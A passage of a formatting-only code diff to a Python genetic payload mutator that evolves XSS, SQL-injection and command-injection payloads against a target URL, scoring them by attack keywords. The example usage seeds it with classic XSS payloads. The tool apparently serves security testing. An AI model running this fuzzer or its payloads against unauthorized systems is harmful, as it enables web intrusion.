-            if any(encoding in payload.payload for encoding in ['&lt;', '&gt;', '%3C', '%3E']):
+            if any(encoding in payload.payload for encoding in ["&lt;", "&gt;", "%3C", "%3E"]):
                 score += 0.3
-            if any(event in payload.payload.lower() for event in ['onload', 'onerror', 'onclick']):
+            if any(event in payload.payload.lower() for event in ["onload", "onerror", "onclick"]):
                 score += 0.4
-        
+
         elif payload.payload_type == PayloadType.SQL_INJECTION:
-            if any(keyword in payload.payload.upper() for keyword in ['SELECT', 'UNION', 'OR', 'AND']):
+            if any(
+                keyword in payload.payload.upper() for keyword in ["SELECT", "UNION", "OR", "AND"]
+            ):
                 score += 0.6
-            if any(comment in payload.payload for comment in ['--', '#', '/*']):
+            if any(comment in payload.payload for comment in ["--", "#", "/*"]):
                 score += 0.3
-        
+
         elif payload.payload_type == PayloadType.COMMAND_INJECTION:
-            if any(separator in payload.payload for separator in [';', '|', '&&', '||']):
+            if any(separator in payload.payload for separator in [";", "|", "&&", "||"]):
                 score += 0.5
-            if any(command in payload.payload.lower() for command in ['ls', 'cat', 'whoami']):
+            if any(command in payload.payload.lower() for command in ["ls", "cat", "whoami"]):
                 score += 0.4
-        
+
         # Penalty for length (prefer shorter payloads)
         score -= len(payload.payload) * 0.01
-        
+
         # Penalty for dead end paths
         score -= payload.dead_end_score
-        
+
         return max(0.0, score)
-    
+
     def intelligent_mutation_selection(self, payload: GeneticPayload) -> Callable:
         """Select mutation based on historical success and search strategy."""
         # Avoid dead end paths
@@ -861,25 +914,25 @@ class GeneticMutator:
         if path_key in self.dead_end_paths:
             # Try different mutation type
             return self._select_alternative_mutation(payload)
-        
+
         # Use weighted selection based on success rates
         return self._weighted_mutation_selection(payload)
-    
+
     def _weighted_mutation_selection(self, payload: GeneticPayload) -> Callable:
         """Select mutation using weighted random selection."""
         mutation_types = list(self.mutation_success_rates.keys())
         weights = [self.mutation_success_rates[mt] for mt in mutation_types]
-        
+
         # Normalize weights
         total_weight = sum(weights)
         if total_weight > 0:
             weights = [w / total_weight for w in weights]
         else:
             weights = [1.0 / len(mutation_types)] * len(mutation_types)
-        
+
         # Select mutation type
         selected_type = random.choices(mutation_types, weights=weights)[0]
-        
+
         # Map to actual mutation function
         if payload.payload_type == PayloadType.XSS:
             return self._mutate_xss
@@ -891,7 +944,7 @@ class GeneticMutator:
             return self._mutate_path
         else:
             return self._mutate_general
-    
+
     def _select_alternative_mutation(self, payload: GeneticPayload) -> Callable:
         """Select alternative mutation when current path is dead end."""
         # Try different mutation types
@@ -901,101 +954,107 @@ class GeneticMutator:
             mutations = [self._mutate_sql, self._mutate_general]
         else:
             mutations = [self._mutate_general]
-        
+
         return random.choice(mutations)
-    
-    def breadth_first_exploration(self, base_payloads: List[str], payload_type: PayloadType,
-                                max_depth: int = 3) -> List[GeneticPayload]:
+
+    def breadth_first_exploration(
+        self, base_payloads: List[str], payload_type: PayloadType, max_depth: int = 3
+    ) -> List[GeneticPayload]:
         """Perform breadth-first exploration of payload space."""
         exploration_results = []
-        
+
         for depth in range(max_depth):
             logger.info(f"Starting breadth-first exploration at depth {depth}")
-            
+
             # Generate variations at current depth
-            current_payloads = base_payloads if depth == 0 else [
-                p.payload for p in exploration_results[-1] if p.differential_score > 0.3
-            ]
-            
+            current_payloads = (
+                base_payloads
+                if depth == 0
+                else [p.payload for p in exploration_results[-1] if p.differential_score > 0.3]
+            )
+
             if not current_payloads:
                 logger.info(f"No promising payloads at depth {depth}, stopping exploration")
                 break
-            
+
             # Create population for this depth
             self.initialize_population(current_payloads, payload_type)
-            
+
             # Set search path depth
             for payload in self.population:
                 payload.search_path_depth = depth
-            
+
             # Evolve with response-based fitness
             fitness_func = self.create_response_based_fitness(self.target_url or "")
             best_payloads = self.evolve(fitness_func)
-            
+
             exploration_results.append(best_payloads)
-            
+
             # Check if we found vulnerabilities
             high_scoring = [p for p in best_payloads if p.differential_score > 0.7]
             if high_scoring:
                 logger.info(f"Found {len(high_scoring)} high-scoring payloads at depth {depth}")
                 break
-        
+
         return [p for batch in exploration_results for p in batch]
-    
+
     def get_search_statistics(self) -> Dict[str, Any]:
         """Get statistics about search performance."""
         return {
-            'total_paths': len(self.search_paths),
-            'dead_end_paths': len(self.dead_end_paths),
-            'successful_patterns': {k.value: len(v) for k, v in self.successful_patterns.items()},
-            'mutation_success_rates': self.mutation_success_rates,
-            'response_statistics': self.response_analyzer.get_statistics()
+            "total_paths": len(self.search_paths),
+            "dead_end_paths": len(self.dead_end_paths),
+            "successful_patterns": {k.value: len(v) for k, v in self.successful_patterns.items()},
+            "mutation_success_rates": self.mutation_success_rates,
+            "response_statistics": self.response_analyzer.get_statistics(),
         }
 
 
 if __name__ == "__main__":
     # Example usage
     import logging
+
     logging.basicConfig(level=logging.INFO)
-    
+
     # Initialize genetic mutator
     mutator = GeneticMutator(population_size=30, max_generations=20)
-    
+
     # Base XSS payloads
     base_payloads = [
         "<script>alert('XSS')</script>",
         "<img src=x onerror=alert(1)>",
-        "javascript:alert(1)"
+        "javascript:alert(1)",
     ]
-    
+
     # Initialize population
     mutator.initialize_population(base_payloads, PayloadType.XSS)
-    
+
     # Define fitness function (example)
     def fitness_function(payload: GeneticPayload) -> float:
         # Simple fitness based on payload characteristics
         score = 0.0
-        
+
         # Reward for having XSS indicators
-        if any(indicator in payload.payload.lower() for indicator in ['script', 'alert', 'javascript']):
+        if any(
+            indicator in payload.payload.lower() for indicator in ["script", "alert", "javascript"]
+        ):
             score += 0.5
-        
+
         # Reward for encoding
-        if any(encoding in payload.payload for encoding in ['&lt;', '&gt;', '%3C', '%3E']):
+        if any(encoding in payload.payload for encoding in ["&lt;", "&gt;", "%3C", "%3E"]):
             score += 0.3
-        
+
         # Reward for event handlers
-        if any(event in payload.payload.lower() for event in ['onload', 'onerror', 'onclick']):
+        if any(event in payload.payload.lower() for event in ["onload", "onerror", "onclick"]):
             score += 0.4
-        
+
         # Penalty for length (prefer shorter payloads)
         score -= len(payload.payload) * 0.01
-        
+
         return max(0.0, score)
-    
+
     # Evolve population
     best_payloads = mutator.evolve(fitness_function)
-    
-    print(f"Best payloads after evolution:")
+
+    print("Best payloads after evolution:")
     for i, payload in enumerate(best_payloads[:5]):
-        print(f"{i+1}. {payload.payload} (fitness: {payload.fitness:.3f})") 
+        print(f"{i + 1}. {payload.payload} (fitness: {payload.fitness:.3f})")
